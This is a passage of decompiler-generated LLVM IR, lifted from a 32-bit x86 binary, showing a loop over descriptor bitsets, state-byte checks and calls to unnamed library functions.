  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
  br i1 %v1_8048ce1, label %dec_label_pc_80484e5, label %dec_label_pc_8048ce9

dec_label_pc_8048ce9:                             ; preds = %dec_label_pc_8048cdd
  %v1_8048ce9 = add i32 %v0_8048597, 20888
  %v2_8048ce9 = inttoptr i32 %v1_8048ce9 to i32*
  store i32 0, i32* %v2_8048ce9, align 4
  %v0_8048cf4 = load i32, i32* @esp, align 4
  %v1_8048cf4 = add i32 %v0_8048cf4, 20884
  %v2_8048cf4 = inttoptr i32 %v1_8048cf4 to i32*
  store i32 1, i32* %v2_8048cf4, align 4
  %v0_8048cff = load i32, i32* @esp, align 4
  %v9_8048cff = icmp eq i32 %v0_8048cff, 12
  store i1 %v9_8048cff, i1* %zf.global-to-local, align 1
  %v1_8048d02 = add i32 %v0_8048cff, 20884
  store i32 %v1_8048d02, i32* %eax.global-to-local, align 4
  %v2_8048d09 = add i32 %v0_8048cff, -16
  %v3_8048d09 = inttoptr i32 %v2_8048d09 to i32*
  store i32 %v1_8048d02, i32* %v3_8048d09, align 4
  %v1_8048d0a = add i32 %v0_8048cff, -20
  %v2_8048d0a = inttoptr i32 %v1_8048d0a to i32*
  store i32 0, i32* %v2_8048d0a, align 4
  %v1_8048d0c = add i32 %v0_8048cff, 20612
  store i32 %v1_8048d0c, i32* %edx.global-to-local, align 4
  %v2_8048d13 = add i32 %v0_8048cff, -24
  %v3_8048d13 = inttoptr i32 %v2_8048d13 to i32*
  store i32 %v1_8048d0c, i32* %v3_8048d13, align 4
  %v1_8048d14 = add i32 %v0_8048cff, 20740
  store i32 %v1_8048d14, i32* %ecx.global-to-local, align 4
  %v2_8048d1b = add i32 %v0_8048cff, -28
  %v3_8048d1b = inttoptr i32 %v2_8048d1b to i32*
  store i32 %v1_8048d14, i32* %v3_8048d1b, align 4
  %v1_8048d1c = add i32 %v0_8048cff, 72
  %v2_8048d1c = inttoptr i32 %v1_8048d1c to i32*
  %v3_8048d1c = load i32, i32* %v2_8048d1c, align 4
  store i32 %v3_8048d1c, i32* %eax.global-to-local, align 4
  %v2_8048d20 = add i32 %v0_8048cff, -32
  %v3_8048d20 = inttoptr i32 %v2_8048d20 to i32*
  store i32 %v3_8048d1c, i32* %v3_8048d20, align 4
  %v0_8048d21 = call i32 @function_8052d88()
  store i32 %v0_8048d21, i32* %eax.global-to-local, align 4
  %v0_8048d26 = load i32, i32* @esp, align 4
  %v9_8048d26 = icmp eq i32 %v0_8048d26, -20
  store i1 %v9_8048d26, i1* %zf.global-to-local, align 1
  store i32 %v0_8048d21, i32* @ebx, align 4
  %v1_8048d2b = add i32 %v0_8048d26, 16
  %v2_8048d2b = inttoptr i32 %v1_8048d2b to i32*
  store i32 0, i32* %v2_8048d2b, align 4
  %v2_8048d2d = call i32 @function_8052e42(i32* %v1_80484ea)
  store i32 %v2_8048d2d, i32* %eax.global-to-local, align 4
  %v1_8048d32 = load i32, i32* @esp, align 4
  %v2_8048d32 = add i32 %v1_8048d32, 132
  %v3_8048d32 = inttoptr i32 %v2_8048d32 to i32*
  store i32 %v2_8048d2d, i32* %v3_8048d32, align 4
  %v0_8048d39 = load i32, i32* @esp, align 4
  %v1_8048d39 = add i32 %v0_8048d39, 16
  %v0_8048d3c = load i32, i32* @ebx, align 4
  %v1_8048d3c = icmp eq i32 %v0_8048d3c, 0
  store i1 %v1_8048d3c, i1* %zf.global-to-local, align 1
  %tmp142 = icmp slt i32 %v0_8048d3c, 1
  br i1 %tmp142, label %dec_label_pc_80484e5, label %dec_label_pc_8048d44

dec_label_pc_8048d44:                             ; preds = %dec_label_pc_8048ce9
  %v1_8048d44 = add i32 %v0_8048d39, 48
  %v2_8048d44 = inttoptr i32 %v1_8048d44 to i32*
  %v3_8048d44 = load i32, i32* %v2_8048d44, align 4
  store i32 %v3_8048d44, i32* %eax.global-to-local, align 4
  %v1_8048d48 = add i32 %v0_8048d39, 60
  %v2_8048d48 = inttoptr i32 %v1_8048d48 to i32*
  store i32 0, i32* %v2_8048d48, align 4
  %v0_8048d50 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048d50, i32* %edx.global-to-local, align 4
  %v1_8048d52 = load i32, i32* @esp, align 4
  %v2_8048d52 = add i32 %v1_8048d52, 92
  %v3_8048d52 = inttoptr i32 %v2_8048d52 to i32*
  store i32 %v0_8048d50, i32* %v3_8048d52, align 4
  %v0_8048db9.pre = load i32, i32* @esp, align 4
  %v0_8048dbd.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048d58:                             ; preds = %dec_label_pc_8048dd2, %dec_label_pc_8048e2e
  %v1_8048e7a = phi i32 [ %v0_8048ddc, %dec_label_pc_8048dd2 ], [ %v0_8048d60.pre, %dec_label_pc_8048e2e ]
  %v0_8048d58 = phi i32 [ %v3_8048dc7, %dec_label_pc_8048dd2 ], [ %v0_8048d58.pre, %dec_label_pc_8048e2e ]
  %v2_8048d5a = udiv i32 %v0_8048d58, 32
  store i32 %v2_8048d5a, i32* %ecx.global-to-local, align 4
  %v1_8048d5d = urem i32 %v0_8048d58, 32
  store i32 %v1_8048d5d, i32* %eax.global-to-local, align 4
  %v2_8048d60 = mul nuw nsw i32 %v2_8048d5a, 4
  %v3_8048d60 = add i32 %v1_8048e7a, 20740
  %v4_8048d60 = add i32 %v3_8048d60, %v2_8048d60
  %v5_8048d60 = inttoptr i32 %v4_8048d60 to i32*
  %v6_8048d60 = load i32, i32* %v5_8048d60, align 4
  %v9_8048d60 = shl i32 1, %v1_8048d5d
  %v10_8048d60 = and i32 %v6_8048d60, %v9_8048d60
  %v11_8048d60 = icmp ne i32 %v10_8048d60, 0
  %v1_8048d68 = zext i1 %v11_8048d60 to i32
  store i32 %v1_8048d68, i32* %eax.global-to-local, align 4
  %v4_8048d6b = icmp eq i1 %v11_8048d60, false
  store i1 %v4_8048d6b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048d6b, label %dec_label_pc_8048d91, label %dec_label_pc_8048d6f

dec_label_pc_8048d6f:                             ; preds = %dec_label_pc_8048d58
  %v1_8048d6f = add i32 %v1_8048e7a, 92
  %v2_8048d6f = inttoptr i32 %v1_8048d6f to i32*
  %v3_8048d6f = load i32, i32* %v2_8048d6f, align 4
  store i32 %v3_8048d6f, i32* %edx.global-to-local, align 4
  %v1_8048d73 = add i32 %v3_8048d6f, -1448
  %v2_8048d73 = inttoptr i32 %v1_8048d73 to i8*
  %v3_8048d73 = load i8, i8* %v2_8048d73, align 1
  %v4_8048d73 = zext i8 %v3_8048d73 to i32
  store i32 %v4_8048d73, i32* @eax, align 4
  %v10_8048d79 = icmp eq i8 %v3_8048d73, 6
  store i1 %v10_8048d79, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d79, label %dec_label_pc_8048e7a, label %dec_label_pc_8048d81

dec_label_pc_8048d81:                             ; preds = %dec_label_pc_8048d6f
  %v10_8048d81 = icmp eq i8 %v3_8048d73, 7
  store i1 %v10_8048d81, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d81, label %dec_label_pc_80494af, label %dec_label_pc_8048d89

dec_label_pc_8048d89:                             ; preds = %dec_label_pc_8048d81
  %v10_8048d89 = icmp eq i8 %v3_8048d73, 10
  store i1 %v10_8048d89, i1* %zf.global-to-local, align 1
  br i1 %v10_8048d89, label %dec_label_pc_80497b3, label %dec_label_pc_8048d91

dec_label_pc_8048d91:                             ; preds = %dec_label_pc_80495e0, %dec_label_pc_8049b0f, %dec_label_pc_8049c31, %dec_label_pc_8049ae5, %dec_label_pc_8048d89, %dec_label_pc_8048d58, %dec_label_pc_8048db9, %dec_label_pc_8049e5a, %dec_label_pc_8049c42, %dec_label_pc_8049af8, %dec_label_pc_8049abf, %dec_label_pc_8049a49, %dec_label_pc_80497f9, %dec_label_pc_804949f, %dec_label_pc_8048e4a, %dec_label_pc_80496c3
  %v0_8048d91 = load i32, i32* @esp, align 4
  %v1_8048d91 = add i32 %v0_8048d91, 44
  %v2_8048d91 = inttoptr i32 %v1_8048d91 to i32*
  %v3_8048d91 = load i32, i32* %v2_8048d91, align 4
  store i32 %v3_8048d91, i32* %edx.global-to-local, align 4
  %v1_8048d95 = add i32 %v0_8048d91, 92
  %v2_8048d95 = inttoptr i32 %v1_8048d95 to i32*
  %v3_8048d95 = load i32, i32* %v2_8048d95, align 4
  %v1_8048d99 = add i32 %v3_8048d95, 3140
  store i32 %v1_8048d99, i32* %eax.global-to-local, align 4
  %v1_8048d9e = add i32 %v3_8048d91, 1
  store i32 %v1_8048d9e, i32* %edx.global-to-local, align 4
  store i32 %v1_8048d9e, i32* %v2_8048d91, align 4
  %v0_8048da3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048da3 = load i32, i32* @esp, align 4
  %v2_8048da3 = add i32 %v1_8048da3, 92
  %v3_8048da3 = inttoptr i32 %v2_8048da3 to i32*
  store i32 %v0_8048da3, i32* %v3_8048da3, align 4
  %v0_8048da7 = load i32, i32* @esp, align 4
  %v1_8048da7 = add i32 %v0_8048da7, 112
  %v2_8048da7 = inttoptr i32 %v1_8048da7 to i32*
  %v3_8048da7 = load i32, i32* %v2_8048da7, align 4
  store i32 %v3_8048da7, i32* %eax.global-to-local, align 4
  %v1_8048dab = add i32 %v0_8048da7, 44
  %v2_8048dab = inttoptr i32 %v1_8048dab to i32*
  %v3_8048dab = load i32, i32* %v2_8048dab, align 4
  %v15_8048dab = icmp eq i32 %v3_8048dab, %v3_8048da7
  store i1 %v15_8048dab, i1* %zf.global-to-local, align 1
  br i1 %v15_8048dab, label %dec_label_pc_80484e5, label %dec_label_pc_8048db5

dec_label_pc_8048db5:                             ; preds = %dec_label_pc_8048d91
  %v1_8048db5 = add i32 %v0_8048da7, 92
  %v2_8048db5 = inttoptr i32 %v1_8048db5 to i32*
  %v3_8048db5 = load i32, i32* %v2_8048db5, align 4
  store i32 %v3_8048db5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8048db9

dec_label_pc_8048db9:                             ; preds = %dec_label_pc_8048d44, %dec_label_pc_8048db5
  %v0_8048dbd = phi i32 [ %v0_8048dbd.pre, %dec_label_pc_8048d44 ], [ %v3_8048db5, %dec_label_pc_8048db5 ]
  %v1_8048dc3 = phi i32 [ %v0_8048db9.pre, %dec_label_pc_8048d44 ], [ %v0_8048da7, %dec_label_pc_8048db5 ]
  %v1_8048db9 = add i32 %v1_8048dc3, 92
  %v2_8048db9 = inttoptr i32 %v1_8048db9 to i32*
  %v3_8048db9 = load i32, i32* %v2_8048db9, align 4
  store i32 %v3_8048db9, i32* %eax.global-to-local, align 4
  %v1_8048dbd = add i32 %v0_8048dbd, -1452
  store i32 %v1_8048dbd, i32* %edx.global-to-local, align 4
  %v2_8048dc3 = add i32 %v1_8048dc3, 76
  %v3_8048dc3 = inttoptr i32 %v2_8048dc3 to i32*
  store i32 %v1_8048dbd, i32* %v3_8048dc3, align 4
  %v0_8048dc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048dc7 = add i32 %v0_8048dc7, -1452
  %v2_8048dc7 = inttoptr i32 %v1_8048dc7 to i32*
  %v3_8048dc7 = load i32, i32* %v2_8048dc7, align 4
  store i32 %v3_8048dc7, i32* %ecx.global-to-local, align 4
  %v10_8048dcd = icmp eq i32 %v3_8048dc7, -1
  store i1 %v10_8048dcd, i1* %zf.global-to-local, align 1
  br i1 %v10_8048dcd, label %dec_label_pc_8048d91, label %dec_label_pc_8048dd2

dec_label_pc_8048dd2:                             ; preds = %dec_label_pc_8048db9
  %v2_8048dd6 = udiv i32 %v3_8048dc7, 32
  store i32 %v2_8048dd6, i32* %edx.global-to-local, align 4
  %v1_8048dd9 = urem i32 %v3_8048dc7, 32
  store i32 %v1_8048dd9, i32* %eax.global-to-local, align 4
  %v0_8048ddc = load i32, i32* @esp, align 4
  %v2_8048ddc = mul nuw nsw i32 %v2_8048dd6, 4
  %v3_8048ddc = add nuw nsw i32 %v2_8048ddc, 20612
  %v4_8048ddc = add i32 %v3_8048ddc, %v0_8048ddc
  %v5_8048ddc = inttoptr i32 %v4_8048ddc to i32*
  %v6_8048ddc = load i32, i32* %v5_8048ddc, align 4
  %v9_8048ddc = shl i32 1, %v1_8048dd9
  %v10_8048ddc = and i32 %v6_8048ddc, %v9_8048ddc
  %v11_8048ddc = icmp ne i32 %v10_8048ddc, 0
  %v1_8048de4 = zext i1 %v11_8048ddc to i32
  store i32 %v1_8048de4, i32* %eax.global-to-local, align 4
  %v4_8048de7 = icmp eq i1 %v11_8048ddc, false
  store i1 %v4_8048de7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048de7, label %dec_label_pc_8048d58, label %dec_label_pc_8048def

dec_label_pc_8048def:                             ; preds = %dec_label_pc_8048dd2
  %v1_8048def = add i32 %v0_8048ddc, 20896
  %v2_8048def = inttoptr i32 %v1_8048def to i32*
  store i32 0, i32* %v2_8048def, align 4
  %v0_8048dfa = load i32, i32* @esp, align 4
  %v1_8048dfa = add i32 %v0_8048dfa, 20892
  %v2_8048dfa = inttoptr i32 %v1_8048dfa to i32*
  store i32 4, i32* %v2_8048dfa, align 4
  %v0_8048e05 = load i32, i32* @esp, align 4
  %v9_8048e05 = icmp eq i32 %v0_8048e05, 12
  store i1 %v9_8048e05, i1* %zf.global-to-local, align 1
  %v1_8048e08 = add i32 %v0_8048e05, 20892
  store i32 %v1_8048e08, i32* %edx.global-to-local, align 4
  %v2_8048e0f = add i32 %v0_8048e05, -16
  %v3_8048e0f = inttoptr i32 %v2_8048e0f to i32*
  store i32 %v1_8048e08, i32* %v3_8048e0f, align 4
  %v1_8048e10 = add i32 %v0_8048e05, 20896
  store i32 %v1_8048e10, i32* %eax.global-to-local, align 4
  %v2_8048e17 = add i32 %v0_8048e05, -20
  %v3_8048e17 = inttoptr i32 %v2_8048e17 to i32*
  store i32 %v1_8048e10, i32* %v3_8048e17, align 4
  %v1_8048e18 = add i32 %v0_8048e05, -24
  %v2_8048e18 = inttoptr i32 %v1_8048e18 to i32*
  store i32 4, i32* %v2_8048e18, align 4
  %v1_8048e1a = add i32 %v0_8048e05, -28
  %v2_8048e1a = inttoptr i32 %v1_8048e1a to i32*
  store i32 1, i32* %v2_8048e1a, align 4
  %v0_8048e1c = load i32, i32* %ecx.global-to-local, align 4
  %v2_8048e1c = add i32 %v0_8048e05, -32
  %v3_8048e1c = inttoptr i32 %v2_8048e1c to i32*
  store i32 %v0_8048e1c, i32* %v3_8048e1c, align 4
  %v0_8048e1d = call i32 @function_80531f0()
  store i32 %v0_8048e1d, i32* %eax.global-to-local, align 4
  %v0_8048e22 = load i32, i32* @esp, align 4
  %v1_8048e22 = add i32 %v0_8048e22, 32
  %v2_8048e25 = add i32 %v0_8048e22, 20928
  %v3_8048e25 = inttoptr i32 %v2_8048e25 to i32*
  %v4_8048e25 = load i32, i32* %v3_8048e25, align 4
  %v5_8048e25 = or i32 %v4_8048e25, %v0_8048e1d
  %v6_8048e25 = icmp eq i32 %v5_8048e25, 0
  store i1 %v6_8048e25, i1* %zf.global-to-local, align 1
  store i32 %v5_8048e25, i32* %eax.global-to-local, align 4
  %v1_8048e2c = icmp eq i1 %v6_8048e25, false
  br i1 %v1_8048e2c, label %dec_label_pc_8048e4a, label %dec_label_pc_8048e2e

dec_label_pc_8048e2e:                             ; preds = %dec_label_pc_8048def
  %v1_8048e2e = add i32 %v0_8048e22, 124
  %v2_8048e2e = inttoptr i32 %v1_8048e2e to i32*
  %v3_8048e2e = load i32, i32* %v2_8048e2e, align 4
  store i32 %v3_8048e2e, i32* %edx.global-to-local, align 4
  %v1_8048e32 = add i32 %v3_8048e2e, -1452
  %v2_8048e32 = inttoptr i32 %v1_8048e32 to i32*
  %v3_8048e32 = load i32, i32* %v2_8048e32, align 4
  store i32 %v3_8048e32, i32* %ecx.global-to-local, align 4
  %v1_8048e38 = add i32 %v3_8048e2e, -1448
  %v2_8048e38 = inttoptr i32 %v1_8048e38 to i8*
  store i8 4, i8* %v2_8048e38, align 1
  %v0_8048d58.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8048d60.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048d58

dec_label_pc_8048e44:                             ; preds = %dec_label_pc_80494dc
  %v0_8048e44 = load i32, i32* @edi, align 4
  %v1_8048e44 = inttoptr i32 %v0_8048e44 to i32*
  store i32 104, i32* %v1_8048e44, align 4
  %v0_8048e4a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e4a

dec_label_pc_8048e4a:                             ; preds = %dec_label_pc_8049b0f, %dec_label_pc_8048e7a, %dec_label_pc_8048def, %dec_label_pc_8048e44
  %v0_8048e4a = phi i32 [ %v1_804950d, %dec_label_pc_8049b0f ], [ %v1_8048eb7, %dec_label_pc_8048e7a ], [ %v1_8048e22, %dec_label_pc_8048def ], [ %v0_8048e4a.pre, %dec_label_pc_8048e44 ]
  %v9_8048e4a = icmp eq i32 %v0_8048e4a, 12
  store i1 %v9_8048e4a, i1* %zf.global-to-local, align 1
  %v1_8048e4d = add i32 %v0_8048e4a, 92
  %v2_8048e4d = inttoptr i32 %v1_8048e4d to i32*
  %v3_8048e4d = load i32, i32* %v2_8048e4d, align 4
  store i32 %v3_8048e4d, i32* %ecx.global-to-local, align 4
  %v1_8048e51 = add i32 %v3_8048e4d, -1452
  %v2_8048e51 = inttoptr i32 %v1_8048e51 to i32*
  %v3_8048e51 = load i32, i32* %v2_8048e51, align 4
  store i32 %v3_8048e51, i32* @ebx, align 4
  %v2_8048e57 = add i32 %v0_8048e4a, -16
  %v3_8048e57 = inttoptr i32 %v2_8048e57 to i32*
  store i32 %v3_8048e51, i32* %v3_8048e57, align 4
  %v1_8048e58 = call i32 @function_8052b81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048e58, i32* %eax.global-to-local, align 4
  %v0_8048e5d = load i32, i32* @esp, align 4
  %v1_8048e5d = add i32 %v0_8048e5d, 108
  %v2_8048e5d = inttoptr i32 %v1_8048e5d to i32*
  %v3_8048e5d = load i32, i32* %v2_8048e5d, align 4
  store i32 %v3_8048e5d, i32* %eax.global-to-local, align 4
  %v6_8048e61 = icmp eq i32 %v0_8048e5d, -16
  store i1 %v6_8048e61, i1* %zf.global-to-local, align 1
  %v1_8048e64 = add i32 %v3_8048e5d, -1452
  %v2_8048e64 = inttoptr i32 %v1_8048e64 to i32*
  store i32 -1, i32* %v2_8048e64, align 4
  %v0_8048e6e = load i32, i32* %eax.global-to-local, align 4
  %v1_8048e6e = add i32 %v0_8048e6e, -1448
  %v2_8048e6e = inttoptr i32 %v1_8048e6e to i8*
  store i8 0, i8* %v2_8048e6e, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8048e7a:                             ; preds = %dec_label_pc_8048d6f
  %v2_8048e7a = add i32 %v1_8048e7a, -4
  %v3_8048e7a = inttoptr i32 %v2_8048e7a to i32*
  store i32 %v4_8048d73, i32* %v3_8048e7a, align 4
  %v0_8048e7b = load i32, i32* @eax, align 4
  %v2_8048e7b = add i32 %v1_8048e7a, -8
  %v3_8048e7b = inttoptr i32 %v2_8048e7b to i32*
  store i32 %v0_8048e7b, i32* %v3_8048e7b, align 4
  %v1_8048e7c = add i32 %v1_8048e7a, -12
  %v2_8048e7c = inttoptr i32 %v1_8048e7c to i32*
  store i32 10240, i32* %v2_8048e7c, align 4
  %v1_8048e81 = add i32 %v1_8048e7a, 131
  store i32 %v1_8048e81, i32* %ecx.global-to-local, align 4
  %v2_8048e88 = add i32 %v1_8048e7a, -16
  %v3_8048e88 = inttoptr i32 %v2_8048e88 to i32*
  store i32 %v1_8048e81, i32* %v3_8048e88, align 4
  %v2_8048e89 = call i32 @function_8052670(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  %v0_8048e8e = load i32, i32* @esp, align 4
  %v1_8048e8e = add i32 %v0_8048e8e, -4
  %v2_8048e8e = inttoptr i32 %v1_8048e8e to i32*
  store i32 16386, i32* %v2_8048e8e, align 4
  %v1_8048e93 = add i32 %v0_8048e8e, -8
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  store i32 10240, i32* %v2_8048e93, align 4
  %v1_8048e98 = add i32 %v0_8048e8e, 147
  store i32 %v1_8048e98, i32* %eax.global-to-local, align 4
  %v2_8048e9f = add i32 %v0_8048e8e, -12
  %v3_8048e9f = inttoptr i32 %v2_8048e9f to i32*
  store i32 %v1_8048e98, i32* %v3_8048e9f, align 4
  %v1_8048ea0 = add i32 %v0_8048e8e, 108
  %v2_8048ea0 = inttoptr i32 %v1_8048ea0 to i32*
  %v3_8048ea0 = load i32, i32* %v2_8048ea0, align 4
  store i32 %v3_8048ea0, i32* %edx.global-to-local, align 4
  %v1_8048ea4 = add i32 %v3_8048ea0, -1452
  %v2_8048ea4 = inttoptr i32 %v1_8048ea4 to i32*
  %v3_8048ea4 = load i32, i32* %v2_8048ea4, align 4
  store i32 %v3_8048ea4, i32* %eax.global-to-local, align 4
  %v2_8048eaa = add i32 %v0_8048e8e, -16
  %v3_8048eaa = inttoptr i32 %v2_8048eaa to i32*
  store i32 %v3_8048ea4, i32* %v3_8048eaa, align 4
  %v0_8048eab = call i32 @function_805324e()
  store i32 %v0_8048eab, i32* %eax.global-to-local, align 4
  %v1_8048eb0 = load i32, i32* @esp, align 4
  %v2_8048eb0 = add i32 %v1_8048eb0, 136
  %v3_8048eb0 = inttoptr i32 %v2_8048eb0 to i32*
  store i32 %v0_8048eab, i32* %v3_8048eb0, align 4
  %v0_8048eb7 = load i32, i32* @esp, align 4
  %v1_8048eb7 = add i32 %v0_8048eb7, 32
  %v1_8048eba = icmp eq i32 %v0_8048eab, 0
  store i1 %v1_8048eba, i1* %zf.global-to-local, align 1
  %tmp143 = icmp slt i32 %v0_8048eab, 1
  br i1 %tmp143, label %dec_label_pc_8048e4a, label %dec_label_pc_8048ebe

dec_label_pc_8048ebe:                             ; preds = %dec_label_pc_8048e7a
  %v1_8048ebe = add i32 %v0_8048eb7, 28
  %v2_8048ebe = inttoptr i32 %v1_8048ebe to i32*
  store i32 4, i32* %v2_8048ebe, align 4
  %v1_8048ec0 = add i32 %v0_8048eb7, 24
  %v2_8048ec0 = inttoptr i32 %v1_8048ec0 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554a4.13 to i32), i32* %v2_8048ec0, align 4
  %v1_8048ec5 = add i32 %v0_8048eb7, 136
  %v2_8048ec5 = inttoptr i32 %v1_8048ec5 to i32*
  %v3_8048ec5 = load i32, i32* %v2_8048ec5, align 4
  store i32 %v3_8048ec5, i32* %eax.global-to-local, align 4
  %v2_8048ec9 = add i32 %v0_8048eb7, 20
  %v3_8048ec9 = inttoptr i32 %v2_8048ec9 to i32*
  store i32 %v3_8048ec5, i32* %v3_8048ec9, align 4
  %v1_8048eca = add i32 %v0_8048eb7, 163
  store i32 %v1_8048eca, i32* %edx.global-to-local, align 4
  %v2_8048ed1 = add i32 %v0_8048eb7, 16
  %v3_8048ed1 = inttoptr i32 %v2_8048ed1 to i32*
  store i32 %v1_8048eca, i32* %v3_8048ed1, align 4
  %v0_8048ed2 = call i32 @function_8052690()
  %v0_8048ed7 = load i32, i32* @esp, align 4
  %v1_8048eda = add i32 %v0_8048ed2, 1
  %v8_8048eda = icmp eq i32 %v1_8048eda, 0
  store i1 %v8_8048eda, i1* %zf.global-to-local, align 1
  store i32 %v1_8048eda, i32* %eax.global-to-local, align 4
  %v1_8049ae5 = add i32 %v0_8048ed7, 120
  %v2_8049ae5 = inttoptr i32 %v1_8049ae5 to i32*
  br i1 %v8_8048eda, label %dec_label_pc_8049ae5, label %dec_label_pc_8048ee1

dec_label_pc_8048ee1:                             ; preds = %dec_label_pc_8048ebe, %dec_label_pc_8049ae5
  %v1_8048ee1 = add i32 %v0_8048ed7, 12
  %v2_8048ee1 = inttoptr i32 %v1_8048ee1 to i32*
  store i32 4, i32* %v2_8048ee1, align 4
  %v1_8048ee3 = add i32 %v0_8048ed7, 8
  %v2_8048ee3 = inttoptr i32 %v1_8048ee3 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554a4.13 to i32), i32* %v2_8048ee3, align 4
  %v3_8048ee8 = load i32, i32* %v2_8049ae5, align 4
  %v2_8048eec = add i32 %v0_8048ed7, 4
  %v3_8048eec = inttoptr i32 %v2_8048eec to i32*
  store i32 %v3_8048ee8, i32* %v3_8048eec, align 4
  %v1_8048eed = add i32 %v0_8048ed7, 147
  store i32 %v1_8048eed, i32* %ecx.global-to-local, align 4
  %v3_8048ef4 = inttoptr i32 %v0_8048ed7 to i32*
  store i32 %v1_8048eed, i32* %v3_8048ef4, align 4
  %v0_8048ef5 = call i32 @function_8052690()
  store i32 %v0_8048ef5, i32* %eax.global-to-local, align 4
  %v0_8048efa = load i32, i32* @esp, align 4
  %v2_8048efa = add i32 %v0_8048ef5, 147
  %v3_8048efa = add i32 %v2_8048efa, %v0_8048efa
  %v4_8048efa = inttoptr i32 %v3_8048efa to i8*
  store i8 0, i8* %v4_8048efa, align 1
  %v0_8048f02 = load i32, i32* @esp, align 4
  %v1_8048f02 = inttoptr i32 %v0_8048f02 to i32*
  %v3_8048f02 = add i32 %v0_8048f02, 4
  %v1_8048f03 = inttoptr i32 %v3_8048f02 to i32*
  %v2_8048f03 = load i32, i32* %v1_8048f03, align 4
  store i32 %v2_8048f03, i32* @edi, align 4
  store i32 0, i32* %v1_8048f03, align 4
  store i32 46, i32* %v1_8048f02, align 4
  %v3_8048f08 = call i32 @function_8051be0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f08, i32* %eax.global-to-local, align 4
  %v0_8048f0d = load i32, i32* @esp, align 4
  %v9_8048f0d = icmp eq i32 %v0_8048f0d, -12
  store i1 %v9_8048f0d, i1* %zf.global-to-local, align 1
  %v2_8048f10 = add i32 %v0_8048f0d, 8
  %v3_8048f10 = inttoptr i32 %v2_8048f10 to i32*
  store i32 %v3_8048f08, i32* %v3_8048f10, align 4
  %v1_8048f11 = add i32 %v0_8048f0d, 120
  %v2_8048f11 = inttoptr i32 %v1_8048f11 to i32*
  %v3_8048f11 = load i32, i32* %v2_8048f11, align 4
  %v2_8048f15 = add i32 %v0_8048f0d, 4
  %v3_8048f15 = inttoptr i32 %v2_8048f15 to i32*
  store i32 %v3_8048f11, i32* %v3_8048f15, align 4
  %v1_8048f16 = add i32 %v0_8048f0d, 147
  store i32 %v1_8048f16, i32* %eax.global-to-local, align 4
  %v3_8048f1d = inttoptr i32 %v0_8048f0d to i32*
  store i32 %v1_8048f16, i32* %v3_8048f1d, align 4
  %v4_8048f1e = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f23 = load i32, i32* @esp, align 4
  %v1_8048f23 = add i32 %v0_8048f23, 16
  %v1_8048f26 = add i32 %v4_8048f1e, 1
  %v8_8048f26 = icmp eq i32 %v1_8048f26, 0
  store i1 %v8_8048f26, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f26, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f26, label %dec_label_pc_8048f33, label %dec_label_pc_8048f29

dec_label_pc_8048f29:                             ; preds = %dec_label_pc_8048ee1
  %v1_8048f29 = add i32 %v0_8048f23, 108
  %v2_8048f29 = inttoptr i32 %v1_8048f29 to i32*
  %v3_8048f29 = load i32, i32* %v2_8048f29, align 4
  store i32 %v3_8048f29, i32* %edx.global-to-local, align 4
  %v1_8048f2d = inttoptr i32 %v3_8048f29 to i32*
  store i32 2, i32* %v1_8048f2d, align 4
  %v1_8048f33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f33

dec_label_pc_8048f33:                             ; preds = %dec_label_pc_8048ee1, %dec_label_pc_8048f29
  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
